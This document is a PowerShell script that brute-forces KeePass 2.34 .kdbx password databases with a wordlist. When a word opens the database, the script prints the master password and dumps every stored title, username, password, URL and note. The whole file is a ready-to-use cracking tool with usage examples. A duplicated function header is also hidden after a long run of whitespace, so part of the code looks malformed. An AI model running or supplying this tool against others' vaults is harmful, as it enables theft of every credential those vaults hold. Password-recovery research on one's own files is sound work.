#requires -version 2
<#
.SYNOPSIS
  
  This script provides a simple dictionary based brute force function allowing you to run a dictionary file against a KeePass 2.34 .kdbx file.  If it finds the key, it will dump all passwords as output as well as inform you of the master password

.DESCRIPTION
  
  The script performs a dictionary attack against keepass .kdbx files

.PARAMETER binpath
    
    This is the path for the KeePass 2.34 files - Typically on a default install will be "c:\program files (x86)\KeePass2x\"


.PARAMETER pwdpath
    
    This is the path for the password file to use in the brute force attempt

.PARAMETER targetfile
    
    This is the path for the target kdbx file


.NOTES
  Version:        0.1
  Author:         Wayne Evans
  Creation Date:  20/12/2016
  Purpose/Change: Initial script development

  This script is quite slow, but will get the job done - It works at about 500 keys per second currently.  
  
.EXAMPLE

crack-keepassfile -binpath "C:\program files (x86)\KeePass2x" -pwdfile "c:\software\pwdlist.txt" -targetfile "c:\software\posh.kdbx"

.TODO

1)allow generated patterns to be used to brute force rather than a dictionary file

  
#>




#----------------------------------------------------------[Declarations]----------------------------------------------------------

#blank some key variables just in case
$passwordList=""
$Password=""



#-----------------------------------------------------------[Functions]------------------------------------------------------------

Function Load-KeePassBinarys{
          param(
          [Parameter(Mandatory=$true)]
          [String]$path
          )
          Begin{ 
                 if ((Test-Path $path) –eq $false) 
                    {
                    Write-Output "The path $path is invalid"
                    write-output "Testing Default Path"
                    If ((Test-Path "C:\Program Files (x86)\KeePass2x") –eq $true) 
                    {
                      $path="C:\Program Files (x86)\KeePass2x"
                      Write-Output "Using Default Path $path"
                    }
                    }
               }
  
          Process{
                    Try { 
                        [Reflection.Assembly]::LoadFile("$path\KeePass.exe")|Out-Null
                        }Catch
                            { 
                             Write-warning "Unable Load KeePass Binarys - check path $path"
                             break
                            }
                    Try { 
                        [Reflection.Assembly]::LoadFile("$path\KeePass.XmlSerializers.dll")|Out-Null
                        }catch 
                            {
                             Write-warning  "Unable Load KeePass Binarys - check path $path"
                             break
                            }
          }
  
          End{
           Write-Output "KeePass Binaries loaded from $path"
          }
            }
                                                                                                                                                                                                                                                                                                                                                                                    function try-key($x){
 function try-key($x){
    $Key = new-object KeePassLib.Keys.CompositeKey
    $Key.AddUserKey((New-Object KeePassLib.Keys.KcpPassword($x)));
    try{
    
    $Database.Open($IOConnectionInfo,$Key,$null)
        
        $items=""
        Write-Warning "Master Password Found = $x "
        write-output "================="
        $Items = $Database.RootGroup.GetObjects($true, $true)
        foreach($Item in $Items)
        {
            write-output Title=$($Item.Strings.ReadSafe("Title"))
            write-output UserName=$($Item.Strings.ReadSafe("UserName"))
            write-output Password=$($Item.Strings.ReadSafe("Password"))
            write-output URL=$($Item.Strings.ReadSafe("URL"))
            write-output Note=$($Item.Strings.ReadSafe("Note"))      
            write-output "================="
              
        }
        $Database.Close()  
        
            break   
   
    }
    catch{
    
    }

  }
 Function load-passwordfile{
          Param(
          [Parameter(Mandatory=$true)]
          [string]$filepath

          )
  
          Begin{

                If ((Test-Path $filepath) –eq $false) {
                Write-Output "The Password File Path: $path is invalid"
                write-output "Checking for Default List"
    
                If ((Test-Path ".\pwdlist.txt") –eq $true) {
                $filepath=".\pwdlist.txt"
                Write-Output "Using Default Password File:$filepath"
                }
                else
                {
                Write-Output "Unable to locate default password file : pwdlist.txt"
                break
                }

        }
    
          }
  
          Process{
                write-output "loading pwd list from $filepath"
                $pwdfile = New-Object System.IO.StreamReader -Arg $filepath
                $count=0
                $sw = [Diagnostics.Stopwatch]::StartNew()
                while ($password = $pwdfile.ReadLine()) {
                try-key($password)
        
                if ($count % 1000 -eq 0)
                {
                Write-Output "Number of Keys checked against Database:$count Elapsed Time = $($sw.Elapsed)"

                }
                $count++
                }
        

          }
  
          End{
           $pwdfile.close()
           $sw.Stop()

          }
            }
 function check-kdbxfile{
        Param(
          [Parameter(Mandatory=$true)]
          [string]$targetfile

          )
  
          Begin{

                If ((Test-Path $targetfile) –eq $false) {
                Write-Output "The Target File Path: $path is invalid"
                Break
        }
    
          }
  
          Process{
                write-output "Confirmed Target Path"
                $IOconnectionInfo.Path =$targetfile
                Return $targetfile
       
          }
  
          End{
   
          }
            }
 Function crack-keepassfile{
          Param(
          [Parameter(Mandatory=$true)]
          [string]$binpath,
          [string]$pwdpath,
          [string]$targetfile
  
  
          )
  
          Begin{
          load-keepassbinarys -path $binpath
          $Database = new-object KeePassLib.PwDatabase
          $IOConnectionInfo = New-Object KeePassLib.Serialization.IOConnectionInfo
          $target=check-kdbxfile -target $targetfile
          }
  
          Process{
   
          load-passwordfile -filepath $pwdpath
 
          }
  
          End{
   
          }
            }


#-----------------------------------------------------------[Execution]------------------------------------------------------------


